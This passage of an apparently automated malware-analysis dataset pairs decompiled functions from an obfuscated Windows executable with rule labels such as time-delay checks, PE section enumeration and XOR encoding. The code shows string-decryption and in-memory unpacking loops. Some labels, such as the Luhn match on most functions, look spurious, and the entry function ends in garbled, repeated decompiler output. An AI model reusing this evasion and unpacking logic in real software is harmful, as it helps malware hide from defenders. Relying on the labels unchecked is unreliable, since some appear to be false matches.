            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n// WARNING: Removing unreachable block (ram,0x00401703)\n// WARNING: Removing unreachable block (ram,0x0040171f)\n\nint32_t __cdecl fcn.004015df(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iStack60;\n    uint var_bp_8h;\n    \n    iVar1 = 0;\n    do {\n        iStack60 = iVar1;\n        iVar1 = iStack60 + 1;\n    } while (*(arg_8h + iStack60) != '\\0');\n    return iStack60;\n}\n",
        "token_count": 146
    },
    "00401feb": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402009)\n\nvoid __cdecl fcn.00401feb(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.004039d3();\n    fcn.004019d1(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 101
    },
    "00402040": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00402040(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    int32_t iVar5;\n    uint arg_8h_00;\n    code *pcVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t arg_10h;\n    int32_t iStack136;\n    uint32_t uStack116;\n    uint32_t uStack112;\n    int32_t iStack96;\n    char acStack88 [32];\n    int32_t iStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint var_ch;\n    \n    uStack36 = 0x3ab9535d;\n    iStack44 = 0;\n    uStack48 = 0x4e35894e;\n    iStack96 = 0;\n    iStack56 = 0;\n    do {\n        arg_10h = (*(iStack96 * 0x104 + 0x4070dc) ^ *(iStack96 * 0x104 + 0x407100)) + iStack56;\n        iStack96 = iStack96 + 1;\n        iStack56 = arg_10h;\n    } while (iStack96 != 0x46);\n    uStack32 = 0x912aa5f8;\n    uStack28 = 0;\n    uStack116 = 0;\n    do {\n        uStack40 = 0x21ce20ab;\n        iVar5 = uStack36 + 0xc546aca4;\n        acStack88[uStack116] = *(uStack116 + 0x4060f9) - *((uStack116 & 0x3ab95364 - uStack36) + 0x406208);\n        uStack116 = uStack116 + iVar5;\n    } while (uStack116 != 0xe);\n    do {\n        arg_8h_00 = fcn.004039d3();\n        uVar7 = uStack36 ^ 0x3ab95359;\n        pcVar6 = fcn.004019d1(arg_8h_00, acStack88);\n        uStack112 = uStack36 ^ 0x3ab9535d;\n        uStack40 = 0x3ab9535d;\n        iVar5 = (*pcVar6)(0, arg_10h, uStack36 ^ 0x3ab9435d, uVar7);\n        iStack136 = 0;\n        while( true ) {\n            uStack32 = uStack32 * uStack32;\n            uVar7 = *(iStack136 * 0x104 + 0x407100);\n            iVar1 = *(iStack136 * 0x104 + 0x4070fc);\n            uVar9 = uStack32 << (uStack32 & 0x1f);\n            if ((uStack32 & 0x20) != 0) {\n                uVar9 = 0;\n            }\n            uStack40 = 0x7abffb7d;\n            uVar2 = *(iStack136 * 0x104 + 0x4070dc);\n            uVar3 = uVar9 & 0x1f;\n            uVar8 = 0x2c588d15 << (uVar9 & 0x1f);\n            uStack32 = uVar8;\n            uStack28 = 0 << uVar3 | 0x2c588d15U >> 0x20 - uVar3;\n            if ((uVar9 & 0x20) != 0) {\n                uStack32 = 0;\n                uStack28 = uVar8;\n            }\n            uVar9 = uVar2 ^ uVar7;\n            bVar4 = 0x361538d3 < uStack48;\n            if (iStack44 != 0) {\n                bVar4 = iStack44 != 0;\n            }\n            if (!bVar4) break;\n            uStack52 = 0;\n            uStack28 = 0;\n            uStack32 = 0x67b6c027;\n            uStack40 = uVar2;\n            if (uVar7 != uVar2) {\n                do {\n                    *(iVar5 + uStack112 + uStack52) = *(iVar1 + uStack52);\n                    uStack52 = uStack52 + 1;\n                    uStack32 = uStack32 | 0x42671247;\n                    uStack40 = uVar9;\n                } while (uStack52 != uVar9);\n            }\n            uStack112 = uStack112 + uVar9;\n            iStack136 = iStack136 + 1;\n            if (iStack136 == 0x46) {\n                fcn.004035f8(iVar5, iVar5, arg_10h);\n                *arg_8h = iVar5 + 0x9bbf;\n                arg_8h[1] = 0xb400;\n                arg_8h[2] = iVar5 + 0x77d;\n                arg_8h[3] = 0x9440;\n                return 0;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 1217
    },
    "00402508": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid fcn.00402508(void)\n\n{\n    uint64_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uchar auVar8 [12];\n    uchar auVar10 [16];\n    uint32_t uStack160;\n    uint64_t auStack148 [4];\n    uint32_t uStack116;\n    uint32_t uStack112;\n    uchar auStack108 [64];\n    int32_t iStack44;\n    int32_t iStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint var_bp_ch;\n    uchar auVar9 [13];\n    uchar uVar11;\n    \n    iVar3 = iStack40;\n    uStack36 = 0x212017f5;\n    uStack112 = 0x5a6896d9;\n    uStack160 = 0;\n    do {\n        do {\n            do {\n                uVar6 = uStack160;\n                uStack116 = uStack112 * 0xcbfacf3;\n                uVar4 = uStack32 << (uStack32 & 0x1f);\n                if ((uStack32 & 0x20) != 0) {\n                    uVar4 = 0;\n                }\n                uVar5 = uStack160 & 7;\n                uStack160 = uStack36 + 0xe0e7cf0;\n                uStack32 = uVar4;\n            } while (0x290e950c < (uStack112 ^ 0x57566be1));\n            uStack32 = 0;\n            uStack160 = 0x456d5e3b;\n        } while (uStack112 * 0xcbfacf3 < 0x528de09f);\n        uVar4 = 0x21201800 - uStack36;\n        *(auStack148 + uVar6) = *(uVar6 + 0x4060c8) - *(uVar5 + 0x406208);\n        iStack44 = 0;\n        uStack160 = uVar6 + 1;\n    } while (uVar6 + 1 != uVar4);\n    do {\n        uVar6 = uStack36 ^ 0x212017fd;\n        uStack28 = 0xffffffff;\n        uStack32 = 0xcff07bc8;\n        iVar7 = 0x21201815 - uStack36;\n        iStack40 = 0x58b7ac12 - iVar3;\n        uVar1 = *(auStack148 + iStack44);\n        uVar11 = SUB141(ZEXT814(uVar1) >> 0x30, 0);\n        auVar9 = ZEXT813(uVar1);\n        auVar8 = ZEXT812(uVar1);\n        auVar10 = psraw(CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(\n                                                            CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(\n                                                            SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313(SUB163(\n                                                            CONCAT214(SUB162(CONCAT115(SUB161(ZEXT816(uVar1) >> 0x38, 0)\n                                                                                       , CONCAT114(SUB151(ZEXT815(uVar1)\n                                                                                                          >> 0x38, 0), \n                                                                                                   ZEXT814(uVar1))) >>\n                                                                             0x70, 0), CONCAT113(uVar11, auVar9)) >>\n                                                            0x68, 0), CONCAT112(uVar11, auVar8)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar9 >> 0x28, 0), ZEXT811(uVar1))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar8 >> 0x28, 0), uVar1)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar9 >> 0x20, 0), uVar1)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar8 >> 0x20, 0), uVar1)) >>\n                                                            0x40, 0), (uVar1 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar1 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar1 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar1 >> 0x10) << 0x20) >> 0x20, 0), (uVar1 >> 8) << 0x18)\n                                                            >> 0x18, 0), (uVar1 >> 8) << 0x10) >> 0x10, 0), \n                                  uVar1 & 0xff | uVar1 << 8), 8);\n        *(auStack108 + iStack44 * 2) = auVar10;\n        iStack40 = iVar3 + 0x564d1733;\n        iStack44 = iStack44 + uVar6;\n        uVar5 = uStack28 >> (uStack32 & 0x1f);\n        uVar2 = uStack32 & 0x1f;\n        uVar6 = uStack28 << 0x20 - uVar2;\n        uVar4 = uStack32 & 0x20;\n        uStack28 = uVar5;\n        uStack32 = uStack32 >> uVar2 | uVar6;\n        if (uVar4 != 0) {\n            uStack28 = 0;\n            uStack32 = uVar5;\n        }\n    } while (iStack44 != iVar7);\n    fcn.00403743(auStack108, 0);\n    return;\n}\n",
        "token_count": 1366
    },
    "004027ac": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004027ac(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uStack76;\n    char acStack72 [32];\n    uint64_t uStack40;\n    int32_t iStack28;\n    int32_t iStack24;\n    uint var_bp_ch;\n    \n    iVar3 = iStack24;\n    iStack28 = 0x3f5be36c;\n    uStack76 = 0;\n    do {\n        do {\n            iStack24 = iVar3 * iVar3;\n            acStack72[uStack76] = *(uStack76 + 0x406211) - *((uStack76 & iStack28 + 0xc0a41c9bU) + 0x406208);\n            uStack76 = uStack76 + 1;\n            uVar4 = 0x70d77a4aU >> (uStack40 & 0x1f) | 0 << 0x20 - (uStack40 & 0x1f);\n            if ((uStack40 & 0x20) != 0) {\n                uVar4 = 0;\n            }\n            uStack40 = uVar4;\n        } while (uStack76 != 0x10);\n        uVar5 = 0 >> (uVar4 & 0x1f);\n        uVar1 = uVar4 & 0x1f;\n        uVar6 = uVar5;\n        uVar2 = uVar4 >> uVar1 | 0 << 0x20 - uVar1;\n        if ((uVar4 & 0x20) != 0) {\n            uVar6 = 0;\n            uVar2 = uVar5;\n        }\n        uStack40 = CONCAT44(uVar6, uVar2);\n        uStack76 = iStack28 + 0xf426685;\n    } while (0xb170ae3eU - iStack28 < 0x6fec6b96);\n    arg_8h = fcn.004039d3();\n    fcn.004019d1(arg_8h, acStack72);\n    return;\n}\n",
        "token_count": 535
    },
    "00402b97": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00402c2c)\n// WARNING: Removing unreachable block (ram,0x00402c44)\n\nvoid __cdecl fcn.00402b97(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uStack48;\n    uint var_bp_ch;\n    \n    uStack48 = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + uStack48) = *(arg_ch + uStack48) - *((uStack48 & 7) + 0x406208);\n            uStack48 = uStack48 + 1;\n        } while (uStack48 != arg_10h);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00403149": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031a9) overlaps instruction at (ram,0x004031a8)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t * fcn.00403149(uint param_1, uint32_t param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    uint8_t uVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    unkbyte6 *extraout_ECX_00;\n    unkbyte6 *pVar7;\n    int32_t extraout_ECX_01;\n    unkbyte6 *extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    int32_t extraout_ECX_04;\n    int32_t extraout_ECX_05;\n    int32_t extraout_ECX_06;\n    int32_t extraout_ECX_07;\n    uint32_t unaff_EBX;\n    uchar *unaff_EBP;\n    int32_t unaff_EDI;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    char cVar10;\n    bool bVar11;\n    char cVar12;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 extraout_ST0_01;\n    float10 extraout_ST0_02;\n    float10 extraout_ST0_03;\n    uint8_t uStack00000018;\n    uint32_t uStack00000019;\n    ulong in_stack_00000018;\n    int32_t iStack00000021;\n    ulong in_stack_00000020;\n    uint32_t uStack00000039;\n    ulong in_stack_00000038;\n    uchar auStack24 [20];\n    uchar uStack4;\n    uchar uStack3;\n    ushort uStack2;\n    \n    do {\n        while( true ) {\n            uStack4 = SUB41(unaff_EBP, 0);\n            uStack3 = unaff_EBP >> 8;\n            uStack2 = unaff_EBP >> 0x10;\n            uVar8 = 0;\n            cVar12 = '\\0';\n            cVar10 = '\\0';\n            (**0x406058)(auStack24, 0xa619c508);\n            if (cVar12 == cVar10) break;\n            LOCK();\n            unaff_EBX = &uStack4 & 0xff000000 | *0x10 - 4;\n            unaff_EBP = &uStack4;\n            if (cVar12 != cVar10) {\ncode_r0x00403078:\n                uStack00000018 = *(iStack00000021 + 4) == -0x33;\ncode_r0x004030e7:\n                return uStack00000018 & 1;\n            }\n        }\n        bVar11 = extraout_ECX_01 + *(unaff_EDI + 0x254e6c9a) + uVar8 < 0;\n        in(0x10);\n        uStack3 = 0xe4;\n        uStack2 = 0x4031;\n        puVar5 = func_0x011218e9();\n        uVar8 = unaff_EBX >> 8;\n        if (!bVar11) {\ncode_r0x004031f0:\n            pcVar2 = swi(0x32);\n            iVar6 = (*pcVar2)();\n            *(iVar6 + -0x30aa5880) = ROUND(extraout_ST0_00);\n            uVar9 = 0;\n            cVar12 = '\\0';\n            cVar10 = iVar6 + -1 < 0;\n            if (iVar6 == 1) {\n                uStack3 = 0x8f;\n                uStack2 = 0x4032;\n                (**0x406008)();\n                iVar6 = extraout_ECX_06;\n                if (cVar12 != cVar10) break;\n                bVar11 = extraout_ECX_06 + *(unaff_EDI + 0x254e6c9a) + uVar9 < 0;\n                in(0x10);\n                uStack3 = 0xa3;\n                uStack2 = 0x4032;\n                puVar5 = func_0x011219a8();\n                if (bVar11) {\n                    bVar11 = (*(unaff_EBX + 0x58) & uVar8) < '\\0';\n                    iVar6 = extraout_ECX_07;\n                    if (!bVar11) goto code_r0x00403268;\n                    return puVar5;\n                }\n                pcVar2 = swi(0x32);\n                iVar6 = (*pcVar2)();\n                *(iVar6 + -0x30aa5880) = ROUND(extraout_ST0_03);\n                cVar10 = false;\n                if ((iVar6 - 1U & 1) != 0) {\n                    return 0x5;\n                }\n            }\ncode_r0x00403209:\n            cVar12 = '\\0';\n            uVar9 = 0;\n            uStack3 = 0x10;\n            uStack2 = 0x4032;\n            uVar4 = (*_sym.imp.USER32.dll_GetClientRect)();\n            iVar6 = extraout_ECX_03;\n            if (cVar12 == cVar10) break;\n            uVar9 = (uVar4 & 0xe5) < 0xa7;\n            goto code_r0x0040318f;\n        }\n        pVar7 = extraout_ECX_02;\n        if ((*(unaff_EBX + 0x58) & uVar8) < '\\0') {\n            return puVar5;\n        }\ncode_r0x004031a9:\n        if ((*(unaff_EBX + 0x58) & uVar8) < '\\0') {\n            return puVar5;\n        }\n        unaff_EBX = *pVar7;\n        unaff_EDI = unaff_EDI + 1;\n        unaff_EBP = 0xa71c6626;\n    } while( true );\n    while( true ) {\n        bVar11 = iVar6 + *(unaff_EDI + 0x254e6c9a) + uVar9 < 0;\n        in(0x10);\n        uStack3 = 0x24;\n        uStack2 = 0x4032;\n        puVar5 = func_0x01121929();\n        if (bVar11) {\n            if ((*(unaff_EBX + 0x58) & uVar8) < '\\0') {\n                return puVar5;\n            }\n            goto code_r0x004031f0;\n        }\n        uVar9 = param_2 < 0x79587b84;\n        pcVar2 = swi(0x32);\n        iVar6 = (*pcVar2)();\n        *(iVar6 + -0x30aa5880) = ROUND(extraout_ST0_01);\n        cVar12 = SBORROW4(iVar6, 1);\n        cVar10 = iVar6 + -1 < 0;\n        uStack00000019 = uStack00000019 & 0xffffff | (iVar6 + -1) * 0x1000000;\n        iVar6 = (*0x403fc4)();\n        if (cVar12 != cVar10) {\n            pcVar1 = extraout_ECX_04 + 0x13 + (iVar6 + 1) * 4;\n            *pcVar1 = *pcVar1 >> 1;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        bVar11 = extraout_ECX_04 + *(unaff_EDI + 0x254e6c9a) + uVar9 < 0;\n        in(0x10);\n        puVar5 = func_0x01121962();\n        if (!bVar11) break;\n        bVar11 = (*(unaff_EBX + 0x58) & uVar8) < '\\0';\n        iVar6 = extraout_ECX_05;\ncode_r0x00403268:\n        if (bVar11) {\n            return puVar5;\n        }\n        uVar9 = *puVar5 < 0;\n        *puVar5 = *puVar5 << 1 | uVar9;\n    }\n    pcVar2 = swi(0x32);\n    iVar6 = (*pcVar2)();\n    *(iVar6 + -0x30aa5880) = ROUND(extraout_ST0_02);\n    uVar9 = 0;\n    cVar12 = '\\0';\n    cVar10 = iVar6 + -1 < 0;\n    if (iVar6 == 1) {\n        uStack3 = 0x8d;\n        uStack2 = 0x4031;\n        cVar3 = (**0x406034)();\n        iVar6 = extraout_ECX;\n        if (cVar12 == cVar10) {\ncode_r0x0040318f:\n            bVar11 = iVar6 + *(unaff_EDI + 0x254e6c9a) + uVar9 < 0;\n            in(0x10);\n            uStack3 = 0xa1;\n            uStack2 = 0x4031;\n            puVar5 = func_0x011218a6();\n            pVar7 = extraout_ECX_00;\n            if (!bVar11) {\n                pcVar2 = swi(0x32);\n                iVar6 = (*pcVar2)();\n                *(iVar6 + -0x30aa5880) = ROUND(extraout_ST0);\n                return 0x48ce2c04;\n            }\n            goto code_r0x004031a9;\n        }\n        if (!cVar10) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        if ((cVar3 != -0x48) ||\n           ((((uStack00000039 ^ uStack00000019) != 0x14bdcc8f && (uStack00000019 <= uStack00000039 + 0x4fec0cdb)) &&\n            (uStack00000018 = 0,  *(iStack00000021 + 3) != 'P')))) goto code_r0x004030e7;\n        goto code_r0x00403078;\n    }\n    goto code_r0x00403209;\n}\n",
        "token_count": 2316
    },
    "004035f8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.004035f8(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iStack60;\n    uint var_bp_ch;\n    \n    iStack60 = 0;\n    do {\n        for (uVar1 = *(iStack60 * 4 + 0x40613c); uVar1 < arg_10h; uVar1 = uVar1 + 0x33) {\n            *(arg_8h + uVar1) = *(arg_ch + uVar1) - *(uVar1 % 0x32 + 0x406107);\n        }\n        iStack60 = iStack60 + 1;\n    } while (iStack60 != 0x33);\n    return;\n}\n",
        "token_count": 196
    },
    "004039d3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403a23)\n\nvoid fcn.004039d3(void)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uchar auVar3 [12];\n    uchar auVar5 [16];\n    uint64_t auStack136 [4];\n    uchar auStack104 [64];\n    uint32_t uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint64_t *puStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    uchar auVar4 [13];\n    uchar uVar6;\n    \n    uStack24 = 0x67694e6;\n    uStack36 = 0xf1c382f;\n    uStack32 = 0x1d71dabb;\n    puStack28 = auStack136;\n    uStack40 = 0;\n    do {\n        *(auStack136 + uStack40) = *(uStack40 + 0x4060d3) - *((uStack40 & 7) + 0x406208);\n        uStack40 = uStack40 + 1;\n        uStack20 = 0x58a8fef9;\n        uStack32 = uStack24 ^ 0x67694e6;\n    } while (uStack40 != 0xe);\n    do {\n        uVar1 = *(auStack136 + uStack32);\n        uVar6 = SUB141(ZEXT814(uVar1) >> 0x30, 0);\n        auVar4 = ZEXT813(uVar1);\n        auVar3 = ZEXT812(uVar1);\n        auVar5 = psraw(CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(\n                                                            CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(\n                                                            SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313(SUB163(\n                                                            CONCAT214(SUB162(CONCAT115(SUB161(ZEXT816(uVar1) >> 0x38, 0)\n                                                                                       , CONCAT114(SUB151(ZEXT815(uVar1)\n                                                                                                          >> 0x38, 0), \n                                                                                                   ZEXT814(uVar1))) >>\n                                                                             0x70, 0), CONCAT113(uVar6, auVar4)) >> 0x68\n                                                            , 0), CONCAT112(uVar6, auVar3)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar4 >> 0x28, 0), ZEXT811(uVar1))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar3 >> 0x28, 0), uVar1)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar4 >> 0x20, 0), uVar1)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar3 >> 0x20, 0), uVar1)) >>\n                                                            0x40, 0), (uVar1 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar1 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar1 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar1 >> 0x10) << 0x20) >> 0x20, 0), (uVar1 >> 8) << 0x18)\n                                                           >> 0x18, 0), (uVar1 >> 8) << 0x10) >> 0x10, 0), \n                                 uVar1 & 0xff | uVar1 << 8), 8);\n        iVar2 = 0x67694ee - uStack24;\n        *(auStack104 + uStack32 * 2) = auVar5;\n        uStack32 = uStack32 + iVar2;\n        uStack20 = 0x9da53980;\n    } while (uStack32 != 0x20);\n    fcn.00403743(auStack104, 0);\n    return;\n}\n",
        "token_count": 958
    },
    "00403b16": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00403b16(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if (*(arg_8h + *(arg_8h + 0x3c)) == 0x4550) {\n        iVar1 = arg_8h + *(arg_8h + 0x3c);\n    }\n    return iVar1;\n}\n",
        "token_count": 117
    },
    "00403ea8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t fcn.00403ea8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    int32_t iStack44;\n    uint var_8h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    iStack44 = -1;\n    if ((iVar1 != 0) && (iStack44 = iVar1,  iVar1 == 1)) {\n        iStack44 = 0;\n    }\n    return iStack44;\n}\n",
        "token_count": 126
    },
    "004013e8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint fcn.004013e8(void)\n\n{\n    uint var_bp_ch;\n    \n    (**0x406040)(0xbe6);\n    (**0x406044)();\n    return 1;\n}\n",
        "token_count": 58
    },
    "004036ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004036ee(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = *(in_FS_OFFSET + arg_8h);\n    var_18h = -1;\n    if ((iVar1 != 0) && (var_18h = iVar1,  iVar1 == 1)) {\n        var_18h = 0;\n    }\n    return var_18h;\n}\n",
        "token_count": 141
    },
    "00403b3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403b3f(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_ch;\n    \n    *(arg_8h + arg_10h) = *(arg_ch + arg_10h) - arg_14h;\n    return;\n}\n",
        "token_count": 79
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid entry0(void)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char cVar3;\n    ushort uVar4;\n    char *pcVar5;\n    uint unaff_EBX;\n    char *unaff_EBP;\n    uint32_t unaff_ESI;\n    uint unaff_EDI;\n    int32_t in_FS_OFFSET;\n    int32_t in_GS_OFFSET;\n    ulong uVar6;\n    unkbyte6 Var7;\n    uchar *puVar8;\n    uint var_4h;\n    \n    *0x40b71c = unaff_EDI;\n    *0x40b720 = unaff_EBX;\n    uVar6 = fcn.00405000(unaff_ESI, unaff_EBP, *0x10);\n    pcVar5 = uVar6 >> 0x20;\n    pcVar2 = uVar6;\n    *(unaff_EBP + -4) = pcVar2;\n    cVar1 = uVar6;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 